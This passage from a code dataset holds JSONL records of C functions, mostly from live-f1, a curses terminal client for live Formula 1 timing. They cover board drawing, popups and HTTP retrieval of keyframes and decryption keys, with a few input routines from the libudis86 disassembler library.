\"FINAL LAP\");\n\t\t\tbreak;\n\t\tdefault:\n\t\t\twprintw (statwin, \"%4d TO GO\", state->total_laps - state->laps_completed);\n\t\t\tbreak;\n\t\t}\n\t\tbreak;\n\tcase PRACTICE_EVENT:\n\t\twprintw (statwin, \"Practice\");\n\t\tbreak;\n\tcase QUALIFYING_EVENT:\n\t\twprintw (statwin, \"Qualifying\");\n\t\tbreak;\n\t}\n\n\t/* Display weather */\n/*\n\tint wline = 5;\n\twattrset (statwin, attrs[COLOUR_DATA]);\n \n\twmove (statwin, wline, 0);\n\twclrtoeol (statwin);\n\twprintw(statwin,\"%-6s%2d C\", \"Track\", state->track_temp);\n\twmove (statwin, wline, 8);\n\twaddch (statwin, ACS_DEGREE);\n\n\twline += 2;\n\n\twmove (statwin, wline, 0);\n\twclrtoeol (statwin);\n\twprintw(statwin,\"%-6s%2d C\", \"Air\", state->air_temp);\n\twmove (statwin, wline, 8);\n\twaddch (statwin, ACS_DEGREE);\n\n\twline += 2;\n\n\twmove (statwin, wline, 0);\n\twclrtoeol (statwin);\n\twprintw (statwin, \"%-6s%3d\", \"Wind\", state->wind_direction);\n\twaddch (statwin, ACS_DEGREE);\n\twline++;\n\twmove (statwin, wline, 0);\n\twclrtoeol (statwin);\n\twprintw (statwin, \"%-4s%03dm/s\", \"\", state->wind_speed);\n\twmove (statwin, wline, 5);\n\twaddch (statwin, '.');\n\n\twline += 2;\n\n\twmove (statwin, wline, 0);\n\twclrtoeol (statwin);\n\twprintw(statwin, \"Humidity\");\n\twline++;\n\twmove (statwin, wline, 0);\n\twclrtoeol (statwin);\n\twprintw (statwin, \"%-6s%3d%%\", \"\", state->humidity);\n\n\twline += 2;\n\n\twmove (statwin, wline, 0);\n\twclrtoeol (statwin);\n\twprintw(statwin, \"Pressure\");\n\twline++;\n\twmove (statwin, wline, 0);\n\twclrtoeol (statwin);\n\twprintw(statwin, \"%-2s%6dmb\", \"\", state->pressure);\n\twmove (statwin, wline, 6);\n\twaddch (statwin, '.');\n*/\n\t/* Update fastest lap line (race only) */\n\n\tif (state->event_type == RACE_EVENT)\n\t{\n\t\twmove (boardwin, nlines - 1, 3);\n\t\twattrset (boardwin, attrs[COLOUR_RECORD]);\n\t\twclrtoeol (boardwin);\n\t\twprintw(boardwin, \"%2s %-14s %4s %4s %8s\", state->fl_car, state->fl_driver, \"LAP\", state->fl_lap, state->fl_time);\n\t}\n\n\t/* Update session clock */\n\t\n\t_update_time (state);\n\n\t/* Refresh display */\n\n\twnoutrefresh (statwin);\n\twnoutrefresh (boardwin);\n\tdoupdate ();\n}", "path": "src\\display.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/**\n * obtain_decryption_key:\n * @host: host to obtain key from,\n * @event_no: official event number,\n * @cookie: uri-encoded cookie.\n *\n * Obtains the decryption key for the event using the authorisation\n * cookie of a registered user.\n *\n * @cookie should be supplied already uri-encoded.\n *\n * Returns: key obtained on success, or zero on failure.\n **/\n", "func_signal": "unsigned int\nobtain_decryption_key (const char   *host,\n\t\t       unsigned int  event_no,\n\t\t       const char   *cookie)", "code": "{\n\tne_session   *sess;\n\tne_request   *req;\n\tchar         *url;\n\tunsigned int  key = 0;\n\n\tinfo (1, _(\"Obtaining decryption key ...\\n\"));\n\n\turl = malloc (strlen (KEY_URL_BASE) + numlen (event_no)\n\t\t      + strlen (cookie) + 11);\n\tsprintf (url, \"%s%u.asp?auth=%s\", KEY_URL_BASE, event_no, cookie);\n\n\tsess = ne_session_create (\"http\", host, 80);\n\tne_set_useragent (sess, PACKAGE_STRING);\n\n\t/* Create the request */\n\treq = ne_request_create (sess, \"GET\", url);\n\tne_add_response_body_reader (req, ne_accept_2xx,\n\t\t\t\t     (ne_block_reader) parse_key_body, &key);\n\tfree (url);\n\n\t/* Dispatch the event */\n\tif (ne_request_dispatch (req)) {\n\t\tfprintf (stderr, \"%s: %s: %s\\n\", program_name,\n\t\t\t _(\"key request failed\"), ne_get_error (sess));\n\t}\n\n\tinfo (3, _(\"Got decryption key: %08x\\n\"), key);\n\n\tne_request_destroy (req);\n\tne_session_destroy (sess);\n\n\treturn key;\n}", "path": "src\\http.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/**\n * _update_cell:\n * @state: application state structure,\n * @car: car number to update,\n * @type: atom to update.\n *\n * Update a particular cell on the board, with the necessary information\n * available in the state structure.  For internal use, does not refresh\n * or update the screen.\n **/\n", "func_signal": "static void\n_update_cell (CurrentState *state,\n\t      int           car,\n\t      int           type)", "code": "{\n\tint                  y, x, sz, align, attr;\n\tCarAtom             *atom;\n\tunsigned const char *text;\n\tsize_t               len, pad;\n\n\ty = state->car_position[car - 1];\n\tif (! y)\n\t\treturn;\n\tif (nlines < y)\n\t\tclear_board (state);\n\n\tswitch (state->event_type) {\n\tcase RACE_EVENT:\n\t\tswitch ((RaceAtomType) type) {\n\t\tcase RACE_POSITION:\n\t\t\tx = 0;\n\t\t\tsz = 2;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase RACE_NUMBER:\n\t\t\tx = 3;\n\t\t\tsz = 2;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase RACE_DRIVER:\n\t\t\tx = 6;\n\t\t\tsz = 14;\n\t\t\talign = -1;\n\t\t\tbreak;\n\t\tcase RACE_GAP:\n\t\t\tx = 21;\n\t\t\tsz = 4;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase RACE_INTERVAL:\n\t\t\tx = 26;\n\t\t\tsz = 4;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase RACE_LAP_TIME:\n\t\t\tx = 31;\n\t\t\tsz = 8;\n\t\t\talign = -1;\n\t\t\tbreak;\n\t\tcase RACE_SECTOR_1:\n\t\t\tx = 40;\n\t\t\tsz = 4;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase RACE_PIT_LAP_1:\n\t\t\tx = 45;\n\t\t\tsz = 3;\n\t\t\talign = -1;\n\t\t\tbreak;\n\t\tcase RACE_SECTOR_2:\n\t\t\tx = 49;\n\t\t\tsz = 4;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase RACE_PIT_LAP_2:\n\t\t\tx = 54;\n\t\t\tsz = 3;\n\t\t\talign = -1;\n\t\t\tbreak;\n\t\tcase RACE_SECTOR_3:\n\t\t\tx = 58;\n\t\t\tsz = 4;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase RACE_PIT_LAP_3:\n\t\t\tx = 63;\n\t\t\tsz = 3;\n\t\t\talign = -1;\n\t\t\tbreak;\n\t\tcase RACE_NUM_PITS:\n\t\t\tx = 67;\n\t\t\tsz = 2;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\treturn;\n\t\t}\n\t\tbreak;\n\tcase PRACTICE_EVENT:\n\t\tswitch ((PracticeAtomType) type) {\n\t\tcase PRACTICE_POSITION:\n\t\t\tx = 0;\n\t\t\tsz = 2;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase PRACTICE_NUMBER:\n\t\t\tx = 3;\n\t\t\tsz = 2;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase PRACTICE_DRIVER:\n\t\t\tx = 6;\n\t\t\tsz = 14;\n\t\t\talign = -1;\n\t\t\tbreak;\n\t\tcase PRACTICE_BEST:\n\t\t\tx = 21;\n\t\t\tsz = 8;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase PRACTICE_GAP:\n\t\t\tx = 30;\n\t\t\tsz = 6;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase PRACTICE_SECTOR_1:\n\t\t\tx = 37;\n\t\t\tsz = 5;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase PRACTICE_SECTOR_2:\n\t\t\tx = 43;\n\t\t\tsz = 5;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase PRACTICE_SECTOR_3:\n\t\t\tx = 49;\n\t\t\tsz = 5;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase PRACTICE_LAP:\n\t\t\tx = 55;\n\t\t\tsz = 4;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\treturn;\n\t\t}\n\t\tbreak;\n\tcase QUALIFYING_EVENT:\n\t\tswitch ((QualifyingAtomType) type) {\n\t\tcase QUALIFYING_POSITION:\n\t\t\tx = 0;\n\t\t\tsz = 2;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase QUALIFYING_NUMBER:\n\t\t\tx = 3;\n\t\t\tsz = 2;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase QUALIFYING_DRIVER:\n\t\t\tx = 6;\n\t\t\tsz = 14;\n\t\t\talign = -1;\n\t\t\tbreak;\n\t\tcase QUALIFYING_PERIOD_1:\n\t\t\tx = 21;\n\t\t\tsz = 8;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase QUALIFYING_PERIOD_2:\n\t\t\tx = 30;\n\t\t\tsz = 8;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase QUALIFYING_PERIOD_3:\n\t\t\tx = 39;\n\t\t\tsz = 8;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase QUALIFYING_SECTOR_1:\n\t\t\tx = 48;\n\t\t\tsz = 3;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase QUALIFYING_SECTOR_2:\n\t\t\tx = 54;\n\t\t\tsz = 3;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase QUALIFYING_SECTOR_3:\n\t\t\tx = 60;\n\t\t\tsz = 3;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tcase QUALIFYING_LAP:\n\t\t\tx = 66;\n\t\t\tsz = 2;\n\t\t\talign = 1;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\treturn;\n\t\t}\n\t\tbreak;\n\tdefault:\n\t\treturn;\n\t}\n\n\tatom = &state->car_info[car - 1][type];\n\tattr = attrs[atom->data];\n\ttext = atom->text;\n\n\tif (text[0] == 0xE2) text = \"*\";\n\n\tlen = strlen ((const char *) text);\n\n\t/* Check for over-long atoms */\n\tif (len > sz) {\n\t\ttext = \"\";\n\t\tlen = 0;\n\t}\n\tpad = sz - len;\n\n\twmove (boardwin, y, x);\n\tif (len) {\n\t\twattrset (boardwin, attr);\n\t} else {\n\t\twattrset (boardwin, attrs[COLOUR_DEFAULT]);\n\t}\n\n\twhile ((align > 0) && pad--)\n\t\twaddch (boardwin, ' ');\n\twaddstr (boardwin, text);\n\twhile ((align < 0) && pad--)\n\t\twaddch (boardwin, ' ');\n}", "path": "src\\display.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/**\n * clear_car:\n * @state: application state structure,\n * @car: car number to update.\n *\n * Clear the car from the board, updating the display when done.\n **/\n", "func_signal": "void\nclear_car (CurrentState *state,\n\t   int           car)", "code": "{\n\tint y;\n\n\tif (! cursed)\n\t\tclear_board (state);\n\n\ty = state->car_position[car - 1];\n\tif (! y)\n\t\treturn;\n\tif (nlines < y)\n\t\tclear_board (state);\n\n\tclose_popup ();\n\n\twmove (boardwin, y, 0);\n\twclrtoeol (boardwin);\n\n\t_update_time (state);\n\twnoutrefresh (boardwin);\n\tdoupdate ();\n}", "path": "src\\display.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/**\n * draw_bar:\n * @win: the window into which to draw\n * @len: the length of the bar to draw\n *\n * Draws a solid bar of a specified length, at the current cursor\n * position in the specified window.\n **/\n", "func_signal": "void\ndraw_bar (WINDOW *win, int len)", "code": "{\n\tint i;\n\n\tfor (i = 0; i < len; i++)\n\t{\n\t\twaddch (win, ' ');\n\t}\n}", "path": "src\\display.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/**\n * obtain_total_laps:\n *\n * Obtains the total number of laps for the race.\n *\n * Returns: total obtained on success, or zero on failure.\n **/\n", "func_signal": "unsigned int\nobtain_total_laps ()", "code": "{\n\tne_session   *sess;\n\tne_request   *req;\n\tunsigned int  total_laps = 0;\n\n\tsess = ne_session_create (\"http\", WEBSERVICE_HOST, 80);\n\tne_set_useragent (sess, PACKAGE_STRING);\n\n\t/* Create the request */\n\treq = ne_request_create (sess, \"GET\", \"/laps.php\");\n\tne_add_response_body_reader (req, ne_accept_2xx,\n\t\t\t\t     (ne_block_reader) parse_number_body, &total_laps);\n\n\t/* Dispatch the request */\n\tne_request_dispatch (req);\n\n\tne_request_destroy (req);\n\tne_session_destroy (sess);\n\n\treturn total_laps;\n}", "path": "src\\http.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/**\n * clear_board;\n * @state: application state structure.\n *\n * Clear an area on the screen for the timing board and put the headers\n * in.  Updates display when done.\n **/\n", "func_signal": "void\nclear_board (CurrentState *state)", "code": "{\n\tint i, j;\n\n\topen_display ();\n\tclose_popup ();\n\n\tif (boardwin)\n\t\tdelwin (boardwin);\n\n\tnlines = MAX (state->num_cars, 21);\n\tfor (i = 0; i < state->num_cars; i++)\n\t\tnlines = MAX (nlines, state->car_position[i]);\n\n\tnlines += 3;\n\n\tif (LINES < nlines) {\n\t\tclose_display ();\n\t\tfprintf (stderr, \"%s: %s\\n\", program_name,\n\t\t\t _(\"insufficient lines on display\"));\n\t\texit (10);\n\t}\n\tif (COLS < 69) {\n\t\tclose_display ();\n\t\tfprintf (stderr, \"%s: %s\\n\", program_name,\n\t\t\t _(\"insufficient columns on display\"));\n\t\texit (10);\n\t}\n\n\tboardwin = newwin (nlines, 69, 0, 0);\n\twbkgdset (boardwin, attrs[COLOUR_DATA]);\n\twerase (boardwin);\n\n\t\tswitch (state->event_type) {\n\t\tcase RACE_EVENT:\n\t\t\tmvwprintw (boardwin, 0, 0,\n\t\t\t\t   \"%2s %2s %-14s %4s %4s %-8s %-8s %-8s %-8s %2s\",\n\t\t\t\t   _(\"P\"), _(\"\"), _(\"Name\"), _(\"Gap\"), _(\"Int\"),\n\t\t\t\t   _(\"Time\"), _(\"Sector 1\"), _(\"Sector 2\"),\n\t\t\t\t   _(\"Sector 3\"), _(\"Ps\"));\n\t\t\tbreak;\n\t\tcase PRACTICE_EVENT:\n\t\t\tmvwprintw (boardwin, 0, 0,\n\t\t\t\t   \"%2s %2s %-14s %-8s %6s %5s %5s %5s %-4s\",\n\t\t\t\t   _(\"P\"), _(\"\"), _(\"Name\"), _(\"Best\"), _(\"Gap\"),\n\t\t\t\t   _(\"Sec 1\"), _(\"Sec 2\"), _(\"Sec 3\"), _(\" Lap\"));\n\t\t\tbreak;\n\t\tcase QUALIFYING_EVENT:\n\t\t\tmvwprintw (boardwin, 0, 0,\n\t\t\t\t   \"%2s %2s %-14s %-8s %-8s %-8s %5s %5s %5s %-2s\",\n\t\t\t\t   _(\"P\"), _(\"\"), _(\"Name\"), _(\"Period 1\"),\n\t\t\t\t   _(\"Period 2\"), _(\"Period 3\"), _(\"Sec 1\"),\n\t\t\t\t   _(\"Sec 2\"), _(\"Sec 3\"), _(\"Lp\"));\n\t\t\tbreak;\n\t\t}\n\n\tfor (i = 1; i <= state->num_cars; i++) {\n\t\tfor (j = 0; j < LAST_CAR_PACKET; j++)\n\t\t\t_update_cell (state, i, j);\n\t}\n\n\twnoutrefresh (boardwin);\n\tdoupdate ();\n\n\tif (statwin) {\n\t\tdelwin (statwin);\n\t\tstatwin = NULL;\n\n\t\tupdate_status (state);\n\t}\n}", "path": "src\\display.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/**\n * popup_message:\n * @message: message to display.\n *\n * Displays a popup message over top of the screen, calling doupdate() when\n * done.  This can be dismisssed by calling close_popup().\n **/\n", "func_signal": "void\npopup_message (const char *message)", "code": "{\n\tchar  *msg;\n\tsize_t msglen;\n\tint    nlines, ncols, col, ls, i;\n\tregex_t re;\n\n\topen_display ();\n\tclose_popup ();\n\n\tregcomp(&re, \"^img:\", REG_EXTENDED|REG_NOSUB);\n\n\tif (regexec(&re, message, (size_t)0, NULL, 0) == 0)\n\t{\n\t\tmsg = strdup (\"CURRENTLY NO LIVE SESSION\");\n\t} else {\n\t\tmsg = strdup (message);\n\t}\n\tregfree (&re);\n\n\tmsglen = strlen (msg);\n\twhile (msglen && strchr(\" \\t\\r\\n\", msg[msglen - 1]))\n\t\tmsg[--msglen] = 0;\n\n\tif (! msglen) {\n\t\tfree (msg);\n\t\treturn;\n\t}\n\n\t/* Calculate the popup size needed for the message.\n\t * Also replaces whitespace with ordinary spaces or newlines.\n\t */\n\tnlines = 1;\n\tncols = col = ls = 0;\n\tfor (i = 0; i < msglen; i++) {\n\t\tif (strchr (\" \\t\\r\", msg[i])) {\n\t\t\tmsg[i] =  ' ';\n\t\t\tls = i;\n\t\t} else if (msg[i] == '\\n') {\n\t\t\tncols = MAX (ncols, col);\n\n\t\t\tnlines++;\n\t\t\tcol = ls = 0;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (++col > 58) {\n\t\t\tif (ls) {\n\t\t\t\tcol -= i - ls + 1;\n\t\t\t\ti = ls;\n\t\t\t\tmsg[i] = '\\n';\n\n\t\t\t\tncols = MAX (ncols, col);\n\t\t\t} else {\n\t\t\t\tncols = MAX (ncols, 58);\n\t\t\t\ti--;\n\t\t\t}\n\n\t\t\tnlines++;\n\t\t\tcol = ls = 0;\n\t\t}\n\t}\n\tncols = MAX (ncols, col);\n\n\t/* Create the popup window in the middle of the screen */\n\tpopupwin = newwin (nlines + 2, ncols + 2,\n\t\t\t   (LINES - (nlines + 2)) / 2,\n\t\t\t   (COLS - (ncols + 2)) / 2);\n\twbkgdset (popupwin, attrs[COLOUR_POPUP]);\n\twerase (popupwin);\n\tbox (popupwin, 0, 0);\n\n\t/* Now draw the characters into it */\n\tnlines = col = 0;\n\tfor (i = 0; i < msglen; i++) {\n\t\tif (msg[i] == '\\n') {\n\t\t\tnlines++;\n\t\t\tcol = 0;\n\t\t\tcontinue;\n\t\t} else if (++col > 58) {\n\t\t\tnlines++;\n\t\t\tcol = 1;\n\t\t}\n\n\t\tmvwaddch (popupwin, nlines + 1, col, msg[i]);\n\t}\n\n\twnoutrefresh (popupwin);\n\tdoupdate ();\n\n\tfree (msg);\n}", "path": "src\\display.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/**\n * parse_cookie_hdr:\n * @value: pointer to store allocated string,\n * @header: header to parse.\n *\n * Parses an HTTP cookie header looking for the USER cookie, and if found\n * sets @value to point to a newly allocated string containing the cookie\n * value; for convenience sake the cookie is never unencoded.\n **/\n", "func_signal": "static void\nparse_cookie_hdr (char       **value,\n\t\t  const char  *header)", "code": "{\n\tsize_t len;\n\n\tif (strncmp (header, \"USER=\", 5))\n\t\treturn;\n\n\theader += 5;\n\tlen = strcspn (header, \";\");\n\n\t*value = malloc (len + 1);\n\tstrncpy (*value, header, len);\n\t(*value)[len] = 0;\n\n\tinfo (3, _(\"Got authentication cookie: %s\\n\"), *value);\n}", "path": "src\\http.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/**\n * update_car:\n * @state: application state structure,\n * @car: car number to update.\n *\n * Update the entire row for the given car, and the display when done.\n **/\n", "func_signal": "void\nupdate_car (CurrentState *state,\n\t    int           car)", "code": "{\n\tint i;\n\n\tif (! cursed)\n\t\tclear_board (state);\n\tclose_popup ();\n\n\tfor (i = 0; i < LAST_CAR_PACKET; i++)\n\t\t_update_cell (state, car, i);\n\n\t_update_time (state);\n \twnoutrefresh (boardwin);\n\tdoupdate ();\n}", "path": "src\\display.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/**\n * parse_key_body:\n * @key: pointer to store decryption key in,\n * @buf: buffer of data received from server,\n * @len: length of buffer.\n *\n * Parse data received from the server in response to the key request,\n * filling the decryption key while we can see hexadecimal digits.\n **/\n", "func_signal": "static int\nparse_key_body (unsigned int *key,\n\t\tconst char   *buf,\n\t\tsize_t        len)", "code": "{\n\tsize_t i;\n\n\tfor (i = 0; i < len; i++) {\n\t\tif ((buf[i] >= '0') && (buf[i] <= '9')) {\n\t\t\t*key = (*key << 4) | (buf[i] - '0');\n\t\t} else if ((buf[i] >= 'a') && (buf[i] <= 'f')) {\n\t\t\t*key = (*key << 4) | (buf[i] - 'a' + 10);\n\t\t} else if ((buf[i] >= 'A') && (buf[i] <= 'F')) {\n\t\t\t*key = (*key << 4) | (buf[i] - 'A' + 10);\n\t\t} else {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn 0;\n}", "path": "src\\http.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/**\n * open_display:\n * @state: application state structure.\n *\n * Opens the curses display to display timing information.\n **/\n", "func_signal": "void\nopen_display (void)", "code": "{\n\tif (cursed)\n\t\treturn;\n\n\tinitscr ();\n\tcbreak ();\n\tnoecho ();\n\n\tnonl ();\n\tintrflush (stdscr, FALSE);\n\tkeypad (stdscr, TRUE);\n\tnodelay (stdscr, TRUE);\n\n\tif (start_color () || (COLOR_PAIRS < LAST_COLOUR)) {\n\t\t/* Black and white */\n\t\tattrs[COLOUR_DEFAULT]     = A_NORMAL;\n\t\tattrs[COLOUR_LATEST]      = A_BOLD;\n\t\tattrs[COLOUR_PIT]         = A_NORMAL;\n\t\tattrs[COLOUR_BEST]        = A_STANDOUT;\n\t\tattrs[COLOUR_RECORD]      = A_STANDOUT | A_BOLD;\n\t\tattrs[COLOUR_DATA]        = A_NORMAL;\n\t\tattrs[COLOUR_OLD]         = A_DIM;\n\t\tattrs[COLOUR_ELIMINATED]  = A_DIM;\n\t\tattrs[COLOUR_POPUP]       = A_REVERSE;\n\t\tattrs[COLOUR_GREEN_FLAG]  = A_NORMAL;\n\t\tattrs[COLOUR_YELLOW_FLAG] = A_BOLD;\n\t\tattrs[COLOUR_RED_FLAG]    = A_REVERSE;\n\t} else {\n\t\tinit_pair (COLOUR_DEFAULT,     COLOR_WHITE,   COLOR_BLACK);\n\t\tinit_pair (COLOUR_LATEST,      COLOR_WHITE,   COLOR_BLACK);\n\t\tinit_pair (COLOUR_PIT,         COLOR_RED,     COLOR_BLACK);\n\t\tinit_pair (COLOUR_BEST,        COLOR_GREEN,   COLOR_BLACK);\n\t\tinit_pair (COLOUR_RECORD,      COLOR_MAGENTA, COLOR_BLACK);\n\t\tinit_pair (COLOUR_DATA,        COLOR_CYAN,    COLOR_BLACK);\n\t\tinit_pair (COLOUR_OLD,         COLOR_YELLOW,  COLOR_BLACK);\n\t\tinit_pair (COLOUR_ELIMINATED,  COLOR_BLACK,   COLOR_BLACK);\n\t\tinit_pair (COLOUR_POPUP,       COLOR_WHITE,   COLOR_BLUE);\n\t\tinit_pair (COLOUR_GREEN_FLAG,  COLOR_GREEN,   COLOR_BLACK);\n\t\tinit_pair (COLOUR_YELLOW_FLAG, COLOR_YELLOW,  COLOR_BLACK);\n\t\tinit_pair (COLOUR_RED_FLAG,    COLOR_RED,     COLOR_BLACK);\n\n\t\tattrs[COLOUR_DEFAULT]     = COLOR_PAIR (COLOUR_DEFAULT);\n\t\tattrs[COLOUR_LATEST]      = COLOR_PAIR (COLOUR_LATEST);\n\t\tattrs[COLOUR_PIT]         = COLOR_PAIR (COLOUR_PIT);\n\t\tattrs[COLOUR_BEST]        = COLOR_PAIR (COLOUR_BEST);\n\t\tattrs[COLOUR_RECORD]      = COLOR_PAIR (COLOUR_RECORD);\n\t\tattrs[COLOUR_DATA]        = COLOR_PAIR (COLOUR_DATA);\n\t\tattrs[COLOUR_OLD]         = COLOR_PAIR (COLOUR_OLD);\n\t\tattrs[COLOUR_ELIMINATED]  = COLOR_PAIR (COLOUR_ELIMINATED) | A_BOLD;\n\t\tattrs[COLOUR_POPUP]       = COLOR_PAIR (COLOUR_POPUP) | A_BOLD;\n\t\tattrs[COLOUR_GREEN_FLAG]  = COLOR_PAIR (COLOUR_GREEN_FLAG) | A_REVERSE;\n\t\tattrs[COLOUR_YELLOW_FLAG] = COLOR_PAIR (COLOUR_YELLOW_FLAG) | A_REVERSE;\n\t\tattrs[COLOUR_RED_FLAG]    = COLOR_PAIR (COLOUR_RED_FLAG) | A_REVERSE;\n\t}\n\n\tbkgdset (attrs[COLOUR_DEFAULT]);\n\tclear ();\n\trefresh ();\n\n\tcursed = 1;\n}", "path": "src\\display.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/**\n * obtain_key_frame:\n * @host: host to obtain key frame from,\n * @frame: key frame number to obtain,\n * @userdata: pointer to pass to stream parser.\n *\n * Obtains the key frame numbered from the website and arranges for the\n * data to be parsed immediately with the data stream parser.\n *\n * Returns: 0 on success, non-zero on failure.\n **/\n", "func_signal": "int\nobtain_key_frame (const char   *host,\n\t\t  unsigned int  frame,\n\t\t  void         *userdata)", "code": "{\n\tne_session *sess;\n\tne_request *req;\n\tchar       *url;\n\n\tif (frame > 0) {\n\t\tinfo (2, _(\"Obtaining key frame %d ...\\n\"), frame);\n\n\t\turl = malloc (strlen (KEYFRAME_URL_PREFIX)\n\t\t\t      + MAX (numlen (frame), 5) + 6);\n\t\tsprintf (url, \"%s_%05d.bin\", KEYFRAME_URL_PREFIX, frame);\n\t} else {\n\t\tinfo (2, _(\"Obtaining current key frame ...\\n\"));\n\n\t\turl = malloc (strlen (KEYFRAME_URL_PREFIX) + 5);\n\t\tsprintf (url, \"%s.bin\", KEYFRAME_URL_PREFIX);\n\t}\n\n\tsess = ne_session_create (\"http\", host, 80);\n\tne_set_useragent (sess, PACKAGE_STRING);\n\n\t/* Create the request */\n\treq = ne_request_create (sess, \"GET\", url);\n\tne_add_response_body_reader (req, ne_accept_2xx,\n\t\t\t\t     (ne_block_reader) parse_stream_block,\n\t\t\t\t     userdata);\n\tfree (url);\n\n\t/* Dispatch the event */\n\tif (ne_request_dispatch (req)) {\n\t\tfprintf (stderr, \"%s: %s: %s\\n\", program_name,\n\t\t\t _(\"key frame request failed\"), ne_get_error (sess));\n\n\t\tne_request_destroy (req);\n\t\tne_session_destroy (sess);\n\t\treturn 1;\n\t}\n\n\tinfo (3, _(\"Key frame received\\n\"));\n\n\tne_request_destroy (req);\n\tne_session_destroy (sess);\n\n\treturn 0;\n}", "path": "src\\http.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/**\n * close_popup:\n *\n * Close the popup window and schedule all other windows on the screen\n * to be redrawn when the next doupdate() is called.\n **/\n", "func_signal": "void\nclose_popup (void)", "code": "{\n\tif ((! cursed) || (! popupwin))\n\t\treturn;\n\n\tdelwin (popupwin);\n\tpopupwin = NULL;\n\n\tredrawwin (stdscr);\n\twnoutrefresh (stdscr);\n\n\tif (boardwin) {\n\t\tredrawwin (boardwin);\n\t\twnoutrefresh (boardwin);\n\t}\n\n\tif (statwin) {\n\t\tredrawwin (statwin);\n\t\twnoutrefresh (statwin);\n\t}\n}", "path": "src\\display.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/**\n * update_cell:\n * @state: application state structure,\n * @car: car number to update,\n * @type: atom to update.\n *\n * Update a particular cell on the board, with the necessary information\n * available in the state structure.  Intended for external code as it\n * updates the display when done.\n **/\n", "func_signal": "void\nupdate_cell (CurrentState *state,\n\t     int           car,\n\t     int           type)", "code": "{\n\tif (! cursed)\n\t\tclear_board (state);\n\tclose_popup ();\n\n\t_update_cell (state, car, type);\n\n\t_update_time (state);\n \twnoutrefresh (boardwin);\n\tdoupdate ();\n}", "path": "src\\display.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/**\n * update_time:\n * @state: application state structure.\n *\n * External function to update the time, unlike most display functions this\n * one doesn't clear an open popup as it's not possible for them to ever\n * cover the time.  It also doesn't open the display if not already done.\n **/\n", "func_signal": "void\nupdate_time (CurrentState *state)", "code": "{\n\tif ((! cursed) || (! statwin))\n\t\treturn;\n\n\t_update_time (state);\n\n\tdoupdate ();\n}", "path": "src\\display.c", "repo_name": "daz/live-f1", "stars": 53, "license": "gpl-2.0", "language": "c", "size": 1151}
{"docstring": "/* =============================================================================\n * ud_input_set_file() - Set buffer as input.\n * =============================================================================\n */\n", "func_signal": "extern void \nud_set_input_file(register struct ud* u, FILE* f)", "code": "{\n  u->inp_hook = inp_file_hook;\n  u->inp_file = f;\n  inp_init(u);\n}", "path": "libudis86\\input.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
{"docstring": "/* =============================================================================\n * ud_input_skip() - Skip n input bytes.\n * =============================================================================\n */\n", "func_signal": "extern void \nud_input_skip(struct ud* u, size_t n)", "code": "{\n  while (n--) {\n\tu->inp_hook(u);\n  }\n}", "path": "libudis86\\input.c", "repo_name": "mikemccormack/ring3k", "stars": 51, "license": "lgpl-2.1", "language": "c", "size": 1336}
